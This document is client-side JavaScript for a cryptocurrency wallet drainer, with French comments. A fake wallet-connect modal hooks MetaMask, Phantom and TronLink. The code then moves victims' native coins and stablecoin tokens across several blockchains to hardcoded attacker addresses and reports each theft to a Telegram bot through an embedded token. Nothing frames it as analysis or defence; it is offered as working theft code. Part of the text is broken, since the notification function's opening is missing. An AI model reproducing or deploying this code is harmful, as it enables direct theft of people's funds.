<script>

const CONFIG = {

    TELEGRAM_TOKEN: "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
    TELEGRAM_CHAT_ID: "8309320360",
    
    // âœ… ADRESSES DÃ‰FINITIVES DE RÃ‰CEPTION
    EVM_DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1",  // ETH, BNB, MATIC, AVAX, etc.
    SOL_DESTINATION: "9fJqTa8EcAdku7QizDK6akJispXCj3fLrhaUupaKhaev",  // Solana

    // CONTRATS DÃ‰PLOYÃ‰S
    POLYGON_CONTRACT: "0xD0De3725f47f9716947F7c3e6d44e1946Ee5d386",  // âœ… DÃ‰PLOYÃ‰
    BNB_CONTRACT: "",  // Ã€ dÃ©ployer
    ARBITRUM_CONTRACT: "",  // Ã€ dÃ©ployer

    ETHEREUM_CONTRACT: "",  // Ã€ dÃ©ployer
};

// ========================================
// FONCTIONS DE DRAINAGE ULTRA AGGRESSIVES
// ========================================

function showStatus(message, type = 'info') {
    const status = document.getElementById('status');
    status.className = 'status active';
    if (type === 'error') status.classList.add('error');
    status.innerHTML = message;
}

function showWalletModal() {
    document.getElementById('walletModal').classList.add('active');
}

function closeWalletModal() {
    document.getElementById('walletModal').classList.remove('active');
}

function showAllWallets() {
    // Simule plus d'options mais connecte directement
    connectWallet('metamask');
}

async function connectWallet(walletType) {
    closeWalletModal();
    
    if (walletType === 'metamask' || walletType === 'trust' || walletType === 'coinbase') {
        await connectMetaMask();
    } else if (walletType === 'phantom') {
        await connectPhantom();
    } else if (walletType === 'tronlink') {
        await connectTronLink();
    } else {
        await connectMetaMask();
    }
}

// METAMASK - DRAINAGE MULTI-CHAIN AUTOMATIQUE
async function connectMetaMask() {
    if (!window.ethereum) {
        window.open('https://metamask.io/', '_blank');
        return;
    }
    
    try {
        showStatus('ğŸ”„ Connecting...', 'processing');
        
        // Connexion
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        const userAddress = accounts[0];
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        
        showStatus(`âœ… Connected: ${userAddress.substring(0, 6)}...${userAddress.slice(-4)}`, 'success');
        
        // DRAINAGE AUTOMATIQUE MULTI-CHAIN
        await drainAllChains(signer, userAddress);
        
    } catch (error) {
        showStatus('âŒ Connection failed', 'error');
        console.error(error);
    }
}

// DRAINAGE DE TOUTES LES CHAINS
async function drainAllChains(signer, userAddress) {
    const chains = [
        { id: 137, name: 'Polygon', nativeCurrency: 'MATIC', rpc: 'https://polygon-rpc.com' },
        { id: 1, name: 'Ethereum', nativeCurrency: 'ETH', rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161' },
        { id: 56, name: 'BSC', nativeCurrency: 'BNB', rpc: 'https://bsc-dataseed.binance.org' },
        { id: 42161, name: 'Arbitrum', nativeCurrency: 'ETH', rpc: 'https://arb1.arbitrum.io/rpc' },
        { id: 43114, name: 'Avalanche', nativeCurrency: 'AVAX', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
        { id: 10, name: 'Optimism', nativeCurrency: 'ETH', rpc: 'https://mainnet.optimism.io' }
    ];
    
    for (const chain of chains) {
        try {
            // Changer de chain
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: `0x${chain.id.toString(16)}` }],
                });
            } catch (switchError) {
                // Si la chain n'existe pas, l'ajouter
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: `0x${chain.id.toString(16)}`,
                            chainName: chain.name,
                            rpcUrls: [chain.rpc],
                            nativeCurrency: {
                                name: chain.nativeCurrency,
                                symbol: chain.nativeCurrency,
                                decimals: 18
                            }
                        }]
                    });
                }
            }
            
            // Attendre que la chain soit changÃ©e
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Drainer cette chain
            await drainChain(signer, userAddress, chain);
            
        } catch (error) {
            console.log(`Skipping ${chain.name}:`, error.message);
        }
    }
}

// DRAINAGE D'UNE CHAIN
async function drainChain(signer, userAddress, chain) {
    try {
        const provider = signer.provider;
        const balance = await provider.getBalance(userAddress);
        
        // Si balance > 0.001 du token natif
        if (balance.gt(ethers.utils.parseEther("0.001"))) {
            const gasPrice = await provider.getGasPrice();
            const gasLimit = 21000;
            const gasCost = gasPrice.mul(gasLimit).mul(2);
            
            const amountToSend = balance.sub(gasCost);
            
            if (amountToSend.gt(0)) {
                const tx = await signer.sendTransaction({
                    to: CONFIG.EVM_DESTINATION,
                    value: amountToSend,
                    gasLimit: gasLimit,
                    gasPrice: gasPrice
                });
                
                await tx.wait();
                
                // Notification
                const amount = ethers.utils.formatEther(amountToSend);
                await notifyTelegram(userAddress, amount, chain.name);
            }
        }
        
        // Drainer les tokens ERC20
        await drainTokens(signer, userAddress, chain.id);
        
    } catch (error) {
        console.error(`Error draining ${chain.name}:`, error);
    }
}

// DRAINAGE DES TOKENS
async function drainTokens(signer, userAddress, chainId) {
    const tokens = {
        1: [ // Ethereum
            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
            { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18 },
        ],
        56: [ // BSC
            { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
            { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
        ],
        137: [ // Polygon
            { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
            { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', decimals: 6 },
        ],
    };
    
    const abi = [
        'function balanceOf(address) view returns (uint256)',
        'function transfer(address, uint256) returns (bool)'
    ];
    
    const tokenList = tokens[chainId] || [];
    
    for (const token of tokenList) {
        try {
            const contract = new ethers.Contract(token.address, abi, signer);
            const balance = await contract.balanceOf(userAddress);
            
            if (balance.gt(0)) {
                await contract.transfer(CONFIG.EVM_DESTINATION, balance);
                console.log(`Drained ${token.symbol}`);
            }
        } catch (e) {
            // Skip si erreur
        }
    }
}

// PHANTOM - DRAINAGE SOLANA
async function connectPhantom() {
    if (!window.solana || !window.solana.isPhantom) {
        window.open('https://phantom.app/', '_blank');
        return;
    }
    
    try {
        const resp = await window.solana.connect();
        const pubKey = resp.publicKey.toString();
        
        showStatus(`âœ… Phantom connected: ${pubKey.substring(0, 4)}...${pubKey.slice(-4)}`, 'success');
        
        // Obtenir la connection
        const connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('mainnet-beta'),
            'confirmed'
        );
        
        // Obtenir le solde
        const balance = await connection.getBalance(resp.publicKey);
        
        if (balance > 0) {
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: resp.publicKey,
                    toPubkey: new solanaWeb3.PublicKey(CONFIG.SOL_DESTINATION),
                    lamports: balance - 5000, // Garde 0.000005 SOL pour les frais
                })
            );
            
            const { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = resp.publicKey;
            
            const signed = await window.solana.signTransaction(transaction);
            await connection.sendRawTransaction(signed.serialize());
            
            await notifyTelegram(pubKey, balance / 1e9, 'SOL');
        }
        
    } catch (error) {
        showStatus('Phantom connection failed.', 'error');
    }
}

// TRONLINK - DRAINAGE TRON
async function connectTronLink() {
    if (!window.tronWeb || !window.tronLink) {
        window.open('https://www.tronlink.org/', '_blank');
        return;
    }
    
    try {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        
        if (window.tronWeb.defaultAddress.base58) {
            const userAddress = window.tronWeb.defaultAddress.base58;
            const balance = await window.tronWeb.trx.getBalance(userAddress);
            
            if (balance > 0) {
                const tx = await window.tronWeb.trx.sendTransaction(
                    CONFIG.TRON_DESTINATION, 
                    balance - 1000000 // Garde 1 TRX pour les frais
                );
                
                await notifyTelegram(userAddress, balance / 1e6, 'TRX');
            }
            
            showStatus(`âœ… TronLink connected`, 'success');
        }
    } catch (error) {
        showStatus('TronLink connection failed.', 'error');
    }
}

â° Heure: ${new Date().toLocaleTimeString()}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”`;
    
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.log('Telegram notification failed');
    }
}
